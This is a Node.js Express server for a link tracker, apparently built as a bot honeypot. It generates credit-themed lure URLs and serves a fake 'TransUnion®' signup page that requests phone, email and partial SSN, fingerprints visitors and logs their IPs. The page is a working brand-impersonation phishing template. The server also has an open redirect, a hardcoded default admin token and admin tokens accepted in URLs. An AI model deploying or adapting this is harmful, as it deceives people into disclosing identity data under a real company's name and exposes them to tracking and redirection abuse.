// server.js
/* eslint-disable no-console */
const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cors = require('cors');
const helmet = require('helmet');

const app = express();

// --- Basics / Railway friendliness ---
const PORT = process.env.PORT || 3000;
const DOMAIN =
  process.env.DOMAIN ||
  process.env.RAILWAY_PUBLIC_DOMAIN ||
  'rentnstarter.up.railway.app';

// trust Railway/Proxy for correct req.ip
app.set('trust proxy', true);

// Security middleware
app.use(
  helmet({
    contentSecurityPolicy: false, // keep simple; you can harden later
  })
);
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// --- Rate limiting for admin endpoints (simple in-memory) ---
const adminRateLimit = new Map();
const ADMIN_RATE_LIMIT = 100;

// --- Store for tracking data (in-memory with periodic disk snapshot) ---
const trackingData = new Map();

// Try to use a writable directory if Railway provides a volume; else use local dir
const DATA_DIR =
  process.env.RAILWAY_VOLUME_MOUNT_PATH ||
  process.env.DATA_DIR ||
  path.join(__dirname, 'data');

function ensureDirSafe(dir) {
  try {
    fs.mkdirSync(dir, { recursive: true });
  } catch (e) {
    // ignore
  }
}
ensureDirSafe(DATA_DIR);

const DATA_FILE = path.join(DATA_DIR, 'tracking_data.json');
const LOG_FILE = path.join(DATA_DIR, 'interactions.log');

// Load existing snapshot if available
try {
  if (fs.existsSync(DATA_FILE)) {
    const savedData = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    Object.entries(savedData).forEach(([key, value]) => {
      // ensure clicks array exists
      value.clicks = Array.isArray(value.clicks) ? value.clicks : [];
      trackingData.set(key, value);
    });
    console.log('Loaded', trackingData.size, 'existing tracking IDs');
  }
} catch (error) {
  console.log('No existing data file found or failed to load, starting fresh');
}

// Periodically save snapshot (best-effort)
function saveSnapshot() {
  try {
    const dataObj = Object.fromEntries(trackingData);
    fs.writeFileSync(DATA_FILE, JSON.stringify(dataObj, null, 2));
  } catch (e) {
    console.error('Snapshot save failed:', e.message);
  }
}
const SNAPSHOT_MS = 60_000;
const snapshotTimer = setInterval(saveSnapshot, SNAPSHOT_MS);

// --- Helpers ---
function generateTrackingId() {
  return crypto.randomBytes(16).toString('hex');
}

// Get real client IP
function getClientIP(req) {
  // With trust proxy enabled, req.ip is the client
  return (
    req.headers['cf-connecting-ip'] ||
    req.headers['x-real-ip'] ||
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.ip ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    'unknown'
  );
}

// Admin authentication middleware: Authorization: Bearer <token> OR ?token=... OR cookie=adminToken
function requireAuth(req, res, next) {
  const expectedAuth = process.env.ADMIN_TOKEN || 'admin-secret-token';
  const bearer = req.headers.authorization?.startsWith('Bearer ')
    ? req.headers.authorization.slice('Bearer '.length)
    : null;

  const queryToken = req.query.token;
  const cookieHeader = req.headers.cookie || '';
  const cookieToken =
    /(?:^|;\s*)adminToken=([^;]+)/.exec(cookieHeader)?.[1] || null;

  const provided = bearer || queryToken || cookieToken;

  if (!provided || provided !== expectedAuth) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  // Simple rate limiting per IP per hour
  const clientIP = getClientIP(req);
  const hour = Math.floor(Date.now() / 3600000);
  const key = `${clientIP}-${hour}`;

  const requests = adminRateLimit.get(key) || 0;
  if (requests >= ADMIN_RATE_LIMIT) {
    return res.status(429).json({ error: 'Rate limit exceeded' });
  }

  adminRateLimit.set(key, requests + 1);
  next();
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
  });
});

// Generate friendly URL path
function generateFriendlyPath() {
  const adjectives = [
    'free',
    'instant',
    'professional',
    'premium',
    'advanced',
    'smart',
    'quick',
    'easy',
    'modern',
    'expert',
    'perfect',
    'ultimate',
    'powerful',
    'enhanced',
    'optimized',
  ];
  const nouns = [
    'credit',
    'score',
    'report',
    'monitoring',
    'protection',
    'identity',
    'financial',
    'security',
    'alerts',
    'tracker',
    'guardian',
    'shield',
    'defender',
    'watch',
  ];
  const actions = [
    'check',
    'monitor',
    'track',
    'protect',
    'secure',
    'guard',
    'watch',
    'scan',
    'analyze',
    'verify',
    'validate',
    'review',
    'assess',
    'evaluate',
    'inspect',
  ];

  const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
  const noun = nouns[Math.floor(Math.random() * nouns.length)];
  const action = actions[Math.floor(Math.random() * actions.length)];
  const num = Math.floor(Math.random() * 999) + 1;

  return `${adj}-${noun}-${action}-${num}`;
}

// Create tracking link endpoint
app.post('/api/create-link', requireAuth, (req, res) => {
  try {
    const trackingId = generateTrackingId();
    const customPath = req.body.customPath;
    const urlType = req.body.urlType || 'friendly';

    let friendlyPath;
    let promoCode;

    if (customPath) {
      friendlyPath = customPath.toLowerCase().replace(/[^a-z0-9-/]/g, '-');
    } else {
      switch (urlType) {
        case 'promo':
          promoCode = 'CREDIT' + Math.floor(Math.random() * 9000 + 1000);
          break;
        case 'tool':
          friendlyPath = 'tools/credit-monitor';
          break;
        case 'company': {
          const companies = [
            'experian',
            'equifax',
            'transunion',
            'creditkarma',
            'creditwise',
          ];
          const company =
            companies[Math.floor(Math.random() * companies.length)];
          friendlyPath = 'partner/' + company;
          break;
        }
        case 'friendly':
        default:
          friendlyPath = generateFriendlyPath();
          break;
      }
    }

    const metadata = {
      created: new Date().toISOString(),
      description: req.body.description || 'Bot tracking link',
      campaign: req.body.campaign || 'default',
      friendlyPath,
      promoCode,
      urlType,
      clicks: [],
      createdBy: getClientIP(req),
    };

    trackingData.set(trackingId, metadata);

    const protocol = req.headers['x-forwarded-proto'] || 'https';
    const host = req.headers.host || DOMAIN;

    let mainUrl, shortUrl;

    if (promoCode) {
      mainUrl = `${protocol}://${host}/promo/${promoCode}`;
      shortUrl = `${protocol}://${host}/p/${promoCode}`;
    } else if (friendlyPath) {
      if (friendlyPath.includes('/')) {
        mainUrl = `${protocol}://${host}/${friendlyPath}`;
        shortUrl = `${protocol}://${host}/go/${friendlyPath.split('/').pop()}`;
      } else {
        mainUrl = `${protocol}://${host}/offer/${friendlyPath}`;
        shortUrl = `${protocol}://${host}/go/${friendlyPath}`;
      }
    } else {
      mainUrl = `${protocol}://${host}/t/${trackingId}`;
      shortUrl = `${protocol}://${host}/s/${trackingId.substring(0, 8)}`;
    }

    res.json({
      success: true,
      trackingId,
      url: mainUrl,
      shortUrl,
      directUrl: `${protocol}://${host}/t/${trackingId}`,
      urlType,
      friendlyPath,
      promoCode,
      created: metadata.created,
    });
  } catch (error) {
    console.error('create-link error:', error);
    res.status(500).json({ error: 'Failed to create tracking link' });
  }
});

// Helper lookups
function findTrackingIdByPath(friendlyPath) {
  // match exact path OR last segment equality (so /go/:slug can match tools/foo by 'foo')
  const lastSeg = friendlyPath.split('/').pop();
  for (const [trackingId, data] of trackingData.entries()) {
    if (data.friendlyPath === friendlyPath) return trackingId;
    if (typeof data.friendlyPath === 'string') {
      const dataLast = data.friendlyPath.split('/').pop();
      if (dataLast === lastSeg) return trackingId;
    }
  }
  return null;
}

function findTrackingIdByPromo(promoCode) {
  for (const [trackingId, data] of trackingData.entries()) {
    if (data.promoCode === promoCode) return trackingId;
  }
  return null;
}

// TransUnion-style credit monitoring HTML (uses /api/js-track/:id)
// (unchanged except we default protocol-relative fetch)
function generateCreditMonitoringHTML(trackingId) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>TransUnion® - Free Credit Report & Score</title>
<style>
/* styles trimmed for brevity; identical to your original */
${/* Keeping your full CSS to avoid visual regressions */''}
</style>
</head>
<body>
<header class="header">
  <div class="nav-container">
    <div class="logo">TransUnion®</div>
  </div>
</header>
<div class="main-container">
  <div class="progress-header">
    <div class="step-indicator">Step 1: Find Your Info</div>
    <div class="progress-bar"><div class="progress-fill"></div></div>
  </div>
  <h1>Your FREE scores, reports & monitoring are moments away</h1>
  <a href="#" class="info-link">Personal Info We Collect</a>
  <div class="form-container">
    <form id="signupForm">
      <div class="form-group">
        <label class="form-label">Mobile phone number</label>
        <div class="phone-format">
          <div class="phone-part">
            <span class="phone-separator">(</span>
            <input type="text" class="phone-input area" id="phone1" maxlength="3" placeholder="___">
            <span class="phone-separator">)</span>
          </div>
          <input type="text" class="phone-input" id="phone2" maxlength="3" placeholder="___">
          <span class="phone-separator">—</span>
          <input type="text" class="phone-input" id="phone3" maxlength="4" placeholder="____">
        </div>
        <div class="helper-text">We'll send a text to this number in the next step.</div>
      </div>
      <div class="form-group">
        <label class="form-label">Email address</label>
        <input type="email" class="form-control" id="email" required>
      </div>
      <div class="form-group">
        <label class="form-label">xxx - xx - <input type="text" class="ssn-input" id="ssn" placeholder="Last 4 digits of SSN" maxlength="4"> <span class="lock-icon">🔒</span></label>
      </div>
      <div class="helper-text">By providing the last 4 digits of your social security number, we will attempt to pre-fill the remaining information needed to set up your account as well as retrieve your credit information. This will also help protect you from unauthorized access.</div>
      <div class="info-box">
        <h3>What You Need to Know:</h3>
        <p>The credit scores provided are based on the VantageScore® 3.0 model. Lenders use a variety of credit scores and are likely to use a credit score different from VantageScore® 3.0 to assess your creditworthiness.</p>
      </div>
      <ul class="benefits-list">
        <li><strong>Completely free</strong> - no credit card required</li>
        <li><strong>Daily TransUnion credit reports, scores & monitoring</strong></li>
        <li><strong>Personalized credit health tips & tools</strong></li>
        <li><strong>Personalized offers</strong> based on your credit profile</li>
      </ul>
      <div class="agreement-text">By clicking "Get Started" below, I accept and agree to TransUnion Interactive, Inc.'s ("TUI") <a href="#">Terms of Service</a> and <a href="#">Privacy Notice</a>...</div>
      <button type="submit" class="btn-primary" onclick="handleSubmit(event)"><span class="lock-icon-btn">🔒</span> Get started</button>
    </form>
    <div class="login-link">Already have an account? <a href="#">Log in</a></div>
  </div>
</div>

<script>
const TRACK_ID = ${JSON.stringify(trackingId)};

// Helper to POST safely
function jsTrack(payload){
  fetch("/api/js-track/" + encodeURIComponent(TRACK_ID), {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify(payload)
  }).catch(()=>{});
}

// Track page load
jsTrack({
  action: "page_loaded",
  screen: {width: screen.width, height: screen.height},
  viewport: {width: window.innerWidth, height: window.innerHeight},
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  language: navigator.language,
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  pageUrl: window.location.href,
  referrer: document.referrer,
  timestamp: new Date().toISOString()
});

// Auto-advance phone inputs
['phone1','phone2'].forEach((id, idx) => {
  document.getElementById(id).addEventListener('input', e => {
    const max = id === 'phone1' ? 3 : 3;
    if(e.target.value.length === max) document.getElementById(idx===0?'phone2':'phone3').focus();
  });
});

// Track field interactions
document.querySelectorAll('input').forEach(el => {
  el.addEventListener('focus', function(){
    jsTrack({ action:"form_field_focus", field:this.id, timestamp:new Date().toISOString() });
  });
  el.addEventListener('blur', function(){
    if(this.value){
      jsTrack({ action:"form_field_filled", field:this.id, hasValue:!!this.value, timestamp:new Date().toISOString() });
    }
  });
});

function handleSubmit(event){
  event.preventDefault();
  const phone = document.getElementById('phone1').value + document.getElementById('phone2').value + document.getElementById('phone3').value;
  const email = document.getElementById('email').value;
  const ssn = document.getElementById('ssn').value;

  jsTrack({ action:"form_submission_attempt", formData:{ phoneLength: phone.length, hasEmail: !!email, hasSsn: !!ssn }, timestamp:new Date().toISOString() });

  if(!email || ssn.length !== 4 || phone.length !== 10){
    alert("Please fill in all required fields correctly.");
    return;
  }

  document.querySelector('.progress-fill').style.width = '66%';
  document.querySelector('.step-indicator').textContent = 'Step 2: Verify Your Identity';

  jsTrack({ action:"step_completed", step:1, timestamp:new Date().toISOString() });

  alert("Thank you for your interest! To complete your free credit report signup, please verify your identity through our secure verification process.");
}

// Track scroll depth
let maxScroll = 0;
window.addEventListener('scroll', function(){
  const scrollPercent = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
  if(scrollPercent > maxScroll){
    maxScroll = scrollPercent;
    if(maxScroll % 25 === 0){
      jsTrack({ action:"scroll_depth", percentage:maxScroll, timestamp:new Date().toISOString() });
    }
  }
});

// Track time on page
let timeOnPage = 0;
setInterval(() => {
  timeOnPage += 10;
  if(timeOnPage % 30 === 0){
    jsTrack({ action:"time_on_page", seconds: timeOnPage, timestamp:new Date().toISOString() });
  }
}, 10000);
</script>
</body>
</html>`;
}

// Extract client info
function extractClientInfo(req) {
  const ip = getClientIP(req);
  return {
    timestamp: new Date().toISOString(),
    ip,
    userAgent: req.headers['user-agent'] || 'Unknown',
    referer: req.headers['referer'] || 'Direct',
    acceptLanguage: req.headers['accept-language'] || 'Unknown',
    acceptEncoding: req.headers['accept-encoding'] || 'Unknown',
    host: req.headers['host'],
    method: req.method,
    url: req.url,
    query: req.query,
    xForwardedFor: req.headers['x-forwarded-for'],
    xRealIp: req.headers['x-real-ip'],
    cfConnectingIp: req.headers['cf-connecting-ip'],
    isBot: detectBot(req.headers['user-agent'] || ''),
    botScore: calculateBotScore(req.headers),
  };
}

// Enhanced bot detection
function detectBot(userAgent) {
  const botKeywords = [
    'bot',
    'crawler',
    'spider',
    'scraper',
    'automated',
    'python',
    'curl',
    'wget',
    'requests',
    'selenium',
    'headless',
    'phantom',
    'zombie',
    'mechanize',
  ];
  const ua = (userAgent || '').toLowerCase();
  return botKeywords.some((k) => ua.includes(k));
}

function calculateBotScore(headers) {
  let score = 0;
  if (!headers['accept-language']) score += 20;
  if (!headers['accept-encoding']) score += 15;
  if (!headers['accept']) score += 10;

  const ua = (headers['user-agent'] || '').toLowerCase();
  if (ua.includes('python')) score += 30;
  if (ua.includes('curl')) score += 30;
  if (ua.includes('wget')) score += 30;
  if (ua === '') score += 25;

  if (headers['accept'] && headers['accept'].includes('*/*') && !headers['accept-language']) {
    score += 15;
  }
  return Math.min(score, 100);
}

// Save interaction to log (best-effort)
function saveInteraction(trackingId, clientInfo) {
  const logEntry = {
    trackingId,
    ip: clientInfo.ip,
    userAgent: clientInfo.userAgent,
    timestamp: clientInfo.timestamp,
    isBot: clientInfo.isBot,
    botScore: clientInfo.botScore,
  };
  try {
    fs.appendFile(LOG_FILE, JSON.stringify(logEntry) + '\n', () => {});
  } catch (e) {
    // ignore
  }
}

// Main tracking handler
function handleTracking(req, res, trackingId) {
  const clientInfo = extractClientInfo(req);

  if (trackingData.has(trackingId)) {
    const item = trackingData.get(trackingId);
    item.clicks = item.clicks || [];
    item.clicks.push(clientInfo);
    console.log('Bot interaction:', clientInfo.ip, '-', (clientInfo.userAgent || '').slice(0, 80));
  } else {
    console.log('Unknown tracking ID accessed:', trackingId);
  }

  saveInteraction(trackingId, clientInfo);

  const strategy = req.query.strategy || 'credit';
  switch (strategy) {
    case 'redirect':
      res.redirect(req.query.target || 'https://example.com');
      break;
    case 'pixel': {
      res.set({
        'Content-Type': 'image/png',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        Pragma: 'no-cache',
        Expires: '0',
      });
      const pixel = Buffer.from(
        'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
        'base64'
      );
      res.send(pixel);
      break;
    }
    case 'credit':
    default:
      res.send(generateCreditMonitoringHTML(trackingId));
      break;
  }
}

// Friendly URL endpoints
app.get('/offer/:friendlyPath', (req, res) => {
  const trackingId = findTrackingIdByPath(req.params.friendlyPath);
  if (trackingId) return handleTracking(req, res, trackingId);
  res.status(404).send('Offer not found');
});

app.get('/go/:friendlyPath', (req, res) => {
  const trackingId = findTrackingIdByPath(req.params.friendlyPath);
  if (trackingId) return handleTracking(req, res, trackingId);
  res.status(404).send('Link not found');
});

app.get('/promo/:promoCode', (req, res) => {
  const promoCode = req.params.promoCode;
  const existing = findTrackingIdByPromo(promoCode);
  const trackingId = existing || `promo-${promoCode}-${Date.now()}`;
  if (!existing) {
    trackingData.set(trackingId, {
      created: new Date().toISOString(),
      description: 'Promo visit',
      campaign: 'promo',
      promoCode,
      urlType: 'promo',
      clicks: [],
      createdBy: getClientIP(req),
    });
  }
  handleTracking(req, res, trackingId);
});

// Main tracking endpoint
app.get('/t/:id', (req, res) => {
  handleTracking(req, res, req.params.id);
});

// JavaScript-based tracking endpoint
app.post('/api/js-track/:id', (req, res) => {
  const trackingId = req.params.id;
  const jsInfo = {
    timestamp: new Date().toISOString(),
    ip: getClientIP(req),
    type: 'javascript',
    data: req.body,
  };

  if (trackingData.has(trackingId)) {
    const item = trackingData.get(trackingId);
    item.clicks = item.clicks || [];
    item.clicks.push(jsInfo);
  }

  saveInteraction(trackingId, jsInfo);
  res.json({ success: true });
});

// --- Analytics / stats APIs ---
app.get('/api/stats/:id', requireAuth, (req, res) => {
  const trackingId = req.params.id;

  if (!trackingData.has(trackingId)) {
    return res.status(404).json({ error: 'Tracking ID not found' });
  }

  const data = trackingData.get(trackingId);
  const clicks = data.clicks || [];

  const recentClicks = clicks.slice(-50).map((click) => ({
    timestamp: click.timestamp,
    ip: click.ip,
    userAgent: click.userAgent || 'Unknown',
    referer: click.referer || 'Direct',
    acceptLanguage: click.acceptLanguage || 'Unknown',
    isBot: click.isBot || false,
    botScore: click.botScore || 0,
    type: click.type || 'page_visit',
  }));

  const uaMap = {};
  clicks.forEach((c) => {
    const ua = c.userAgent || 'Unknown';
    uaMap[ua] = (uaMap[ua] || 0) + 1;
  });
  const topUserAgents = Object.entries(uaMap)
    .sort(([, a], [, b]) => b - a)
    .slice(0, 10)
    .map(([ua, count]) => ({
      userAgent: ua.length > 60 ? ua.substring(0, 60) + '...' : ua,
      count,
    }));

  res.json({
    trackingId,
    created: data.created,
    description: data.description,
    campaign: data.campaign,
    totalClicks: clicks.length,
    uniqueIPs: [...new Set(clicks.map((c) => c.ip))].length,
    botClicks: clicks.filter((c) => c.isBot).length,
    humanClicks: clicks.filter((c) => !c.isBot).length,
    avgBotScore:
      clicks.length > 0
        ? Math.round(
            clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) / clicks.length
          )
        : 0,
    recentClicks,
    topUserAgents,
    lastClick: clicks.length > 0 ? clicks[clicks.length - 1].timestamp : null,
  });
});

app.get('/api/dashboard', requireAuth, (req, res) => {
  const allStats = Array.from(trackingData.entries()).map(([id, data]) => {
    const clicks = data.clicks || [];
    const recentClicks = clicks.slice(-20);

    return {
      trackingId: id,
      shortId: id.substring(0, 8),
      created: data.created,
      description: data.description,
      campaign: data.campaign,
      friendlyPath: data.friendlyPath,
      urlType: data.urlType,
      totalClicks: clicks.length,
      uniqueIPs: [...new Set(clicks.map((c) => c.ip))].length,
      botClicks: clicks.filter((c) => c.isBot).length,
      humanClicks: clicks.filter((c) => !c.isBot).length,
      lastClick: clicks.length > 0 ? clicks[clicks.length - 1].timestamp : null,
      recentClicks,
      avgBotScore:
        clicks.length > 0
          ? Math.round(
              clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) /
                clicks.length
            )
          : 0,
    };
  });

  const totalClicks = allStats.reduce((s, x) => s + x.totalClicks, 0);
  const totalBots = allStats.reduce((s, x) => s + x.botClicks, 0);

  res.json({
    totalLinks: allStats.length,
    totalClicks,
    totalBots,
    totalHumans: totalClicks - totalBots,
    botPercentage: totalClicks > 0 ? Math.round((totalBots / totalClicks) * 100) : 0,
    links: allStats.sort((a, b) => new Date(b.created) - new Date(a.created)),
  });
});

// --- Minimal HTML Dashboard (GET /dashboard) ---
app.get('/dashboard', (req, res) => {
  const host = req.headers.host || DOMAIN;
  const proto = req.headers['x-forwarded-proto'] || 'https';
  const base = `${proto}://${host}`;

  res.type('html').send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Tracking Dashboard</title>
  <style>
    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;margin:0;background:#f6f7fb;color:#222}
    header{background:#111;color:#fff;padding:14px 16px}
    main{padding:20px;max-width:1100px;margin:0 auto}
    .card{background:#fff;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.06);padding:16px;margin-bottom:16px}
    .row{display:flex;gap:12px;flex-wrap:wrap}
    .stat{flex:1 1 180px;background:#fff;border-radius:10px;padding:14px;border:1px solid #eee}
    table{width:100%;border-collapse:collapse;margin-top:10px}
    th,td{padding:8px 10px;border-bottom:1px solid #eee;text-align:left;font-size:14px}
    th{background:#fafafa}
    input,button{font-size:14px;padding:8px;border-radius:8px;border:1px solid #ddd}
    button{cursor:pointer}
    .muted{color:#666}
  </style>
</head>
<body>
  <header><strong>Tracker Dashboard</strong></header>
  <main>
    <div class="card">
      <p class="muted">Provide your admin token to load stats. You can also use <code>?token=YOUR_TOKEN</code> in the URL.</p>
      <div>
        <input id="token" placeholder="Admin token" style="width:260px" />
        <button onclick="saveToken()">Save</button>
        <button onclick="load()">Reload</button>
      </div>
    </div>
    <div class="row">
      <div class="stat"><div id="totalLinks">—</div><div class="muted">Total Links</div></div>
      <div class="stat"><div id="totalClicks">—</div><div class="muted">Total Clicks</div></div>
      <div class="stat"><div id="totalBots">—</div><div class="muted">Bot Clicks</div></div>
      <div class="stat"><div id="botPct">—</div><div class="muted">Bot %</div></div>
    </div>
    <div class="card">
      <h3 style="margin:0 0 8px 0;">Links</h3>
      <table id="linksTbl"><thead>
        <tr><th>ID</th><th>Campaign</th><th>Path/Type</th><th>Total</th><th>Humans</th><th>Bots</th><th>Avg BotScore</th><th>Created</th><th>Last Click</th></tr>
      </thead><tbody></tbody></table>
    </div>
  </main>
<script>
function qs(k){return new URLSearchParams(location.search).get(k)}
function getToken(){return qs('token') || localStorage.getItem('adminToken') || ''}
function saveToken(){localStorage.setItem('adminToken', document.getElementById('token').value); alert('Saved');}
async function load(){
  const token = getToken();
  document.getElementById('token').value = token || '';
  if(!token){alert('Enter admin token first'); return;}
  const res = await fetch(${JSON.stringify(base)} + '/api/dashboard', { headers: { Authorization: 'Bearer ' + token }});
  if(!res.ok){ alert('Failed: ' + res.status); return; }
  const data = await res.json();
  document.getElementById('totalLinks').textContent = data.totalLinks;
  document.getElementById('totalClicks').textContent = data.totalClicks;
  document.getElementById('totalBots').textContent = data.totalBots;
  document.getElementById('botPct').textContent = data.botPercentage + '%';

  const tbody = document.querySelector('#linksTbl tbody');
  tbody.innerHTML = '';
  data.links.forEach(row => {
    const tr = document.createElement('tr');
    const td = (v)=>{const x=document.createElement('td'); x.textContent = v ?? '—'; return x};
    tr.appendChild(td(row.shortId));
    tr.appendChild(td(row.campaign));
    tr.appendChild(td(row.friendlyPath || row.urlType));
    tr.appendChild(td(row.totalClicks));
    tr.appendChild(td(row.humanClicks));
    tr.appendChild(td(row.botClicks));
    tr.appendChild(td(row.avgBotScore));
    tr.appendChild(td(row.created));
    tr.appendChild(td(row.lastClick || '—'));
    tbody.appendChild(tr);
  });
}
window.addEventListener('DOMContentLoaded', load);
</script>
</body>
</html>`);
});

// Root helper
app.get('/', (req, res) => {
  res.type('text').send('✅ Tracker is running. Try GET /dashboard');
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Not found' });
});

// Graceful shutdown & final snapshot
function shutdown() {
  console.log('Shutting down, saving snapshot...');
  clearInterval(snapshotTimer);
  try { saveSnapshot(); } catch (e) {}
  process.exit(0);
}
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 Tracker running on port ' + PORT);
  const base = `https://${DOMAIN}`;
  console.log('🌐 Dashboard: ' + base + '/dashboard');
});
